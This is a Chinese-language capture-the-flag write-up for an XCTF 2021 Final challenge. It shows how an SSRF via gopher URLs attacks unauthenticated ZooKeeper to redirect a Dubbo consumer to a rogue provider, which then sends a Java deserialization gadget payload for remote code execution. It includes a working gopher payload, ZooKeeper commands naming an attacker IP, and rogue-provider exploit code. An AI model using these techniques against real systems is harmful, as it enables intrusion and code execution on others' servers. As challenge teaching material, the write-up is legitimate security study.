@@ -1,0 +1,100 @@
+## 前言
+之前dubbo爆过一些provider的rce洞，比如@Ruilin的CVE-2020-1948，还有一些其他写法导致的不同协议反序列化。分析这些漏洞我们可以看出，dubbo的consumer和provider通信的过程中，对rpc时传递的dubbo协议数据解析后直接进行了反序列化操作。
+既然可以通过反序列化攻击provider，那能不能用类似的方法去攻击consumer呢？我们可以通过SSRF攻击Zookeeper结合[@threedream曾经发过的Rogue-Dubbo](https://xz.aliyun.com/t/7354)实现RCE
+## 预期思路分析
+### 1\. Dubbo consumer反序列化
+Dubbo
+Consumer和Privoder的通信过程如下图，Dubbo作为一个具备高可用特性的RPC框架，Provider和Consumer都会集群部署多个节点，而节点间的配置信息会注册到Registry中，这里Registry使用的是Zookeeper。而这种RPC框架的通信通常使用序列化+自定义的协议，这里读一下Dubbo源码可以发现Dubbo默认采用的是自定义的Dubbo协议和Hessian序列化。
+因为Dubbo默认使用的是Hessian序列化实现方式对RPC中传输的数据进行序列化，通过分析已有的Hessian反序列化链，可以发现使用最泛广的是spring
+aop中的一个类，但由于很多的dubbo
+consumer不一定使用到spring，因此，存在一定的局限性。通过分析consumer对通信数据的处理过程，也就是decodeBody方法，此处重点关注else分支部分，可以看到RPC调用provider返回数据的解析，跟进CodecSupport.deserialize
+    protected Object decodeBody(Channel channel, InputStream is, byte[] header) throws IOException {
+        byte flag = header[2];
+        byte proto = (byte)(flag & 31);
+         long id = Bytes.bytes2long(header, 4);
+        ObjectInput in;
+        if ((flag & -128) == 0) {
+            ...
+        } else {
+            Request req = new Request(id);
+            req.setVersion(Version.getProtocolVersion());
+            ...
+            try {
+                Object data;
+                if (req.isEvent()) {
+                in = CodecSupport.deserialize(channel.getUrl(), is, proto);
+                data = this.decodeEventData(channel, in);
+                ...
+deserialize中通过id获得对应的反序列化器，然后进行相应的反序列化操作。比如id为3时，返回的是JavaObjectInput，调用的也就是java原生的反序列化。而id是provider返回的数据中的，看decodeBody的实现可以看到`byte
+proto = (byte)(flag & 31);`，因此 **如果我们可以控制provider的返回数据** ，那这里就存在一个java反序列化漏洞。
+    public static ObjectInput deserialize(URL url, InputStream is, byte proto) throws IOException {
+        Serialization s = getSerialization(url, proto);
+        return s.deserialize(url, is);
+    }
+    public static Serialization getSerialization(URL url, Byte id) throws IOException {
+        Serialization serialization = getSerializationById(id);
+        String serializationName = url.getParameter("serialization", "hessian2");
+        if (serialization != null && (id != 3 && id != 7 && id != 4 || serializationName.equals(ID_SERIALIZATIONNAME_MAP.get(id)))) {
+            return serialization;
+        } else {
+            throw new IOException("Unexpected serialization id:" + id + " received from network, please check if the peer send the right id.");
+        }
+    }
+### 2\. SSRF攻击Zookeeper
+那如何控制provider的返回值呢？dubbo注册的provider地址储存在zookeeper中，如果我们可以控制zookeeper，那就可以更改provider的地址，从而使consumer连接我们的rogue
+dubbo provider。
+题目给了一个ssrf当作入口，测试发现可以使用gopher。结合给的dockerfile，gopher的ssrf是可以攻击未授权的zookeeper的。
+**因此思路就很明确了：gopher打zookeeper使dubbo consumer连接rogue dubbo provider实现RCE。**
+攻击原理流程图如下：
+socat转发出来看一下zookeeper的通信过程。
+    socat -v -x tcp-listen:9993,fork tcp-connect:127.0.0.1:2181
+    zkCli -server 127.0.0.1:9993
+可以看到，zookeeper通过心跳包维持同一个tcp连接，socat可以清楚的看到每个包的from
+to序号，如果想通过gopher攻击，就需要把最开始那个from 0 to 48的类似握手包的东西放在前面。
+这里我没去仔细的研究zookeeper的协议，直接抓包改gopher了。
+    ls /
+    ?url=gopher://127.0.0.1:9993/_%2500%2500%2500%252d%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2575%2530%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2510%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%250e%2500%2500%2500%2509%2500%2500%2500%2508%2500%2500%2500%2501%252f%2500
+用这种方式，我们就能用ssrf攻击zookeeper了。  
+查看zookeeper中dubbo注册的服务字段结构，可以清楚的发现要更改的值：/dubbo/dubbo.service.DemoService/providers/
+而在provider目录下，dubbo又新建了一个urlencode过的url当作path，这就是我们要更改的provider地址。
+    dubbo%3A%2F%2Fip%3A20890%2Fdubbo.service.DemoService%3Fanyhost%3Dtrue%26application%3Ddubbo-provider%26bean.name%3DServiceBean%3Adubbo.service.DemoService%3A1.0.0%26deprecated%3Dfalse%26dubbo%3D2.0.2%26dynamic%3Dtrue%26generic%3Dfalse%26interface%3Ddubbo.service.DemoService%26methods%3DsayHello%26pid%3D41643%26register%3Dtrue%26release%3D2.7.3%26revision%3D1.0.0%26side%3Dprovider%26serialization%3djava%26timestamp%3D1605961792779%26version%3D1.0.0
+因此需要create的path如下：
+    create /dubbo/dubbo.service.DemoService/providers/dubbo%3A%2F%2F139.199.203.253%3A20890%2Fdubbo.service.DemoService%3Fanyhost%3Dtrue%26application%3Ddubbo-provider%26bean.name%3DServiceBean%3Adubbo.service.DemoService%3A1.0.0%26deprecated%3Dfalse%26dubbo%3D2.0.2%26dynamic%3Dtrue%26generic%3Dfalse%26interface%3Ddubbo.service.DemoService%26methods%3DsayHello%26pid%3D41643%26register%3Dtrue%26release%3D2.7.3%26revision%3D1.0.0%26side%3Dprovider%26serialization%3djava%26timestamp%3D1605961792779%26version%3D1.0.0 139.199.203.253
+一开始apache老崩，后来换成了nginx+fpm，结果忘了fpm能rce...有的师傅省去了构造流量这部分的步骤直接代理进去连zk了。
+### 3\. rogue dubbo provider实现
+threedream已经把dubbo协议写的很清楚了,这里只要改一改几个字段值，改一下序列化数据就行。题目没给pom，因此需要用jrmp listener
+fuzz一下Gadget，参考exp:
+    // header.
+    byte[] header = new byte[16];
+    // set magic number.
+    Bytes.short2bytes((short) 0xdabb, header);
+    // set request and serialization flag.
+    header[2] = (byte) ((byte) 0x80 | 0x20 | 3);
+    // set request id.
+    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    Object o = CC5.getObj();
+    ByteArrayOutputStream readobjByteArrayOutputStream = new ByteArrayOutputStream();
+    ObjectOutputStream oos =new ObjectOutputStream(readobjByteArrayOutputStream);
+    oos.writeByte(1);
+    oos.writeObject(o);
+    Bytes.int2bytes(readobjByteArrayOutputStream.size(), header, 12);
+    byteArrayOutputStream.write(header);
+    byteArrayOutputStream.write(readobjByteArrayOutputStream.toByteArray());
+    byte[] bytes = byteArrayOutputStream.toByteArray();
+    ServerSocket serverSocket = new ServerSocket(20890);
+    while(true){
+        Socket server = serverSocket.accept();
+        System.out.println("Remote ip：" + server.getRemoteSocketAddress());
+        DataOutputStream out = new DataOutputStream(server.getOutputStream());
+        out.write(bytes);
+        out.flush();
+        out.close();
+        server.close();
+    }
+题目环境及所有exp见[github](https://github.com/LFYSec/XCTF2021Final-Dubbo)
+## 可能存在的非预期
+就在题目刚上前一晚，发现Github Security
+Team给Dubbo官方交了一个洞，并且r00t4dm大佬发了一部分[分析](https://t.zsxq.com/bU7Mnai)
+出来，而我们的consumer是能直接访问的，当时就觉得是不是要被非预期了。仔细研究了一下，发现ScriptRouter还是注册到了registry中，因此也需要控了zk后才能rce，因此也算是一种解法吧。具体分析参考threedream师傅的分析文章：  
+## 参考链接
